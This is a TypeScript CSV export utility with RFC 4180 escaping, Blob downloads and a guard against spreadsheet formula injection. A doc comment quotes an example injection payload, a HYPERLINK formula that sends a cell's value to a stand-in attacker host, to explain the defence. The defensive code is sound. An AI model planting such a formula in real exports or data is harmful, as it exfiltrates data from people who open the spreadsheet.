/**
 * Shared CSV export.
 *
 * Every export in the app must route through here. Hand-rolled exporters have
 * repeatedly shipped the same three defects: unescaped quotes producing
 * malformed files, `data:` URLs that silently truncate, and — most seriously —
 * no guard against spreadsheet formula injection.
 */

/**
 * Characters that make Excel, LibreOffice and Google Sheets treat a cell as a
 * formula rather than text. A supplier or material name is free text that
 * reaches this file unmodified, and master data is editable in-app and
 * importable from CSV, so a value like
 *
 *     =HYPERLINK("https://attacker.example/?x="&A1,"Click")
 *
 * would execute on open and exfiltrate the row. Prefixing with a single quote
 * neutralises it while still displaying the original text to the reader.
 *
 * Tab and carriage return are included because several spreadsheet apps strip
 * leading whitespace before evaluating, which would otherwise defeat the guard.
 */
const FORMULA_TRIGGERS = ['=', '+', '-', '@', '\t', '\r'];

function neutraliseFormula(str: string): string {
  return FORMULA_TRIGGERS.some(c => str.startsWith(c)) ? `'${str}` : str;
}

/** RFC 4180 field encoding, with formula injection neutralised first. */
export function escapeCsvValue(val: unknown): string {
  if (val === null || val === undefined) return '';
  const str = neutraliseFormula(String(val));
  // \r matters as well as \n: a lone CR also breaks row parsing.
  if (/[",\n\r]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

/** Builds RFC 4180 CSV text from a header row and body rows. */
export function toCsvText(headers: string[], rows: unknown[][]): string {
  const head = headers.map(escapeCsvValue).join(',');
  const body = rows.map(r => r.map(escapeCsvValue).join(','));
  return [head, ...body].join('\r\n');
}

/**
 * Triggers a browser download of CSV text.
 *
 * Uses a Blob rather than a `data:` URL: `encodeURI` on a data URL leaves `#`
 * unescaped, so any value containing a hash silently truncates the file at
 * that point, and data URLs additionally hit browser length limits on large
 * exports. The object URL is revoked afterwards — without that, every export
 * leaks its blob for the lifetime of the page.
 */
export function downloadCsv(csvText: string, filename: string): void {
  // UTF-8 BOM so Excel reads non-ASCII (e.g. Arabic supplier names) correctly.
  const blob = new Blob([new Uint8Array([0xef, 0xbb, 0xbf]), csvText], {
    type: 'text/csv;charset=utf-8;',
  });
  const url = URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = filename.endsWith('.csv') ? filename : `${filename}.csv`;
  link.style.visibility = 'hidden';
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(url);
}

/**
 * Column-mapped export. Returns false when there was nothing to write.
 *
 * `columns` is wrapped in NoInfer so the element type is fixed by `data`
 * alone. Without it TypeScript tries to infer T from the `keyof T | (item: T)
 * => unknown` union as well, that union is a weak inference site, and every
 * accessor parameter collapsed to `unknown` at the call site.
 */
export function exportToCsv<T>(
  data: T[],
  filename: string,
  columns: { header: string; key: keyof NoInfer<T> | ((item: NoInfer<T>) => unknown) }[]
): boolean {
  if (data.length === 0) return false;
  const rows = data.map(item =>
    columns.map(col => (typeof col.key === 'function' ? col.key(item) : item[col.key]))
  );
  downloadCsv(toCsvText(columns.map(c => c.header), rows), filename);
  return true;
}
